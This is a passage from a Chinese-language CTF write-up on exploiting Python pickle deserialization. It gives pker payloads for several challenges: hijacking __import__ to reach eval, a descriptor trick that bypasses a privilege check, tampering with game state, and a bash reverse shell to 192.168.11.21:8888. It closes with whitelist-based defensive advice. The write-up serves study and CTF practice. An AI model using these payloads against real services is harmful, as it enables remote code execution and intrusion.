1. `__builtins__`是所有模块公有的字典，记录所有内建函数，可以通过对`__builtins__`内相应key对应函数的修改劫持相应的函数。由于题目调用了`__import__`函数，我们可以通过修改`__import__`劫持`getattr`函数。
2. `__dict__`列表储存并决定了一个对象的所有属性，如果其内容被改变，属性也会改变。
3. `c`的实现过程调用了`find_class`函数（顺带一提，它实际上是先`import`再调用`find_class`，但是由于python的import语句其实是使用了五个参数调用的`__import`，无法利用），而本题的`find_class`中多调用了一次`__imoprt__`，随后调用`getattr`，这包含了一个查值的过程，这一点很重要。

然后我们理一下利用过程：

1. 目标：`structs.__builtins__['eval']`→需要`structs.__builtins__.get`函数。
2. 实现二级跳转：劫持`__import__`为`structs.__getattribute__`，opcode`cstructs`变为`structs.__getattribute__(structs).xxx`。
3. 结合1、2：`structs.__getattribute__(structs)`要返回`structs.__builtins__`；xxx则设置为get。
4. 利用`structs.__dict__`对`structs`赋值新属性`structs.structs`为`structs.__builtins__`，以便`structs.__getattribute__(structs)`返回`structs.__builtins__`。

pker实现：

```
__dict__ = GLOBAL('structs', '__dict__') # structs的属性dict
__builtins__ = GLOBAL('structs', '__builtins__') # 内建函数dict
gtat = GLOBAL('structs', '__getattribute__') # 获取structs.__getattribute__
__builtins__['__import__'] = gtat # 劫持__import__函数
__dict__['structs'] = __builtins__ # 把structs.structs属性赋值为__builtins__
builtin_get = GLOBAL('structs', 'get') # structs.__getattribute__('structs').get
eval = builtin_get('eval') # structs.structs['eval']（即__builtins__['eval']
eval('print(123)')
return
```

#### BalsnCTF:pyshv3

v3的`find_class`与v1类似，并限制了`structs`模块，与v1和v2不同的是，v3的flag是由程序读取的，不用达到RCE权限。关键代码为：

```
class Pysh(object):
    def __init__(self):
        self.key = os.urandom(100)
        self.login()
        self.cmds = {
            'help': self.cmd_help,
            'whoami': self.cmd_whoami,
            'su': self.cmd_su,
            'flag': self.cmd_flag,
        }

    def login(self):
        with open('../flag.txt', 'rb') as f:
            flag = f.read()
        flag = bytes(a ^ b for a, b in zip(self.key, flag))
        user = input().encode('ascii')
        user = codecs.decode(user, 'base64')
        user = pickle.loads(user)
        print('Login as ' + user.name + ' - ' + user.group)
        user.privileged = False
        user.flag = flag
        self.user = user

    def run(self):
        while True:
            req = input('$ ')
            func = self.cmds.get(req, None)
            if func is None:
                print('pysh: ' + req + ': command not found')
            else:
                func()

    ...

    def cmd_flag(self):
        if not self.user.privileged:
            print('flag: Permission denied')
        else:
            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))


if __name__ == '__main__':
    pysh = Pysh()
    pysh.run()
```

程序先进行一次pickle反序列化，`self.user.privileged`被设置为`False`，然后进入命令执行循环流程，而且提供`cmd_flag`函数，如果`self.user.privileged`为`True`，就会返回flag。
当类实现了`__get__`、`__set__`和`__delete__`任一方法时，该类被称为“描述器”类，该类的实例化为描述器。对于一个某属性为描述器的类来说，其实例化的对象在查找该属性或设置属性时将不再通过`__dict__`，而是调用该属性描述器的`__get__`、`__set__`或`__delete__`方法。需要注意的是，一个类必须在声明时就设置属性为描述器，使之成为类属性，而不是对象属性，此时描述器才能起作用。
所以，如果我们设置`User`类的`__set__`函数，它就成为了描述器；再将它设置为`User`类本身的`privileged`属性时，该属性在赋值时就会调用`__set__`函数而不会被赋值，从而绕过赋值获得flag。
pker代码为：

```
User=GLOBAL('structs','User')
User.__set__=GLOBAL('structs','User') # 使User成为描述器类
des=User('des','des') # 描述器
User.privileged=des # 注意此处必须设置描述器为类的属性，而不是实例的属性
user=User('hachp1','hachp1') # 实例化一个User对象

return user
```

#### watevrCTF-2019: Pickle Store

解析思路见前文手写opcode的CTF实战部分，pker代码为：

```
system=GLOBAL('os', 'system')
system('bash -c "bash -i >& /dev/tcp/192.168.11.21/8888 0>&1"')
return
```

#### SUCTF-2019:guess_game

题目是一个猜数字游戏，每次对输入的数据反序列化作为ticket，并与随机生成的ticket进行对比，猜对10次就给flag。`find_class`函数限制了`guess_game`模块并禁止了下划线（魔术方法、变量）：

```
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe classes
        if "guess_game" == module[0:10] and "__" not in name:
            return getattr(sys.modules[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))
```

直接作弊用pickle改`game.ticket`为猜测的ticket，然后把`win_count`和`round_count`都改为9（因为还要进行一轮，`round_count`必须大于10才会出现输赢判断，而给flag的依据是`win_count`等于10轮），pickle伪代码：

```
ticket=INST('guess_game.Ticket','Ticket',(1))
game=GLOBAL('guess_game','game')
game.win_count=9
game.round_count=9
game.curr_ticket=ticket

return ticket
```

#### 高校战疫网络安全分享赛: webtmp

解析思路见前文手写opcode的CTF实战部分，pker代码为：

```
secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下
secret.name='1'
secret.category='2'
animal = INST('__main__', 'Animal','1','2')
return animal
```

## 后记

- 为了解决pickle反序列化的问题，官方给出了使用改写 `Unpickler.find_class()` 方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制`module`和`name`并充分考虑到白名单中的各模块和各函数是否有危险。
- CTF中，pickle相关的题目一般考察对python本身（如对魔术方法和属性等）的深度理解，利用过程可以很巧妙。
- 由于pickle“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是`find_class`函数，即`c`、`i`等opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助`getattr`、`get`等函数。
- 借助pker可以比较方便的编写pickle的opcode，该工具是做题利器。
- 本文涉及的CTF题目已整理至github：https://github.com/HACHp1/pickle_ctf_collection

## 参考资料

- [官方文档：pickle --- Python 对象序列化](https://docs.python.org/zh-cn/3/library/pickle.html)
- [How pickle works in Python](https://rushter.com/blog/pickle-serialization-internals/)
- [blackhat-Sour Pickle: A serialised exploitation guide in one part](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)
- [一篇文章带你理解漏洞之 Python 反序列化漏洞](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/)
- [通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)
- [pker](https://github.com/eddieivan01/pker)
- [Code-Breaking中的两个Python沙箱](https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html)
- [从Balsn CTF pyshv学习python反序列化](https://www.smi1e.top/从balsn-ctf-pyshv学习python反序列化/)
- [利用python反序列化覆盖秘钥——watevrCTF-2019: Pickle Store的第二种解法](https://xz.aliyun.com/t/7320)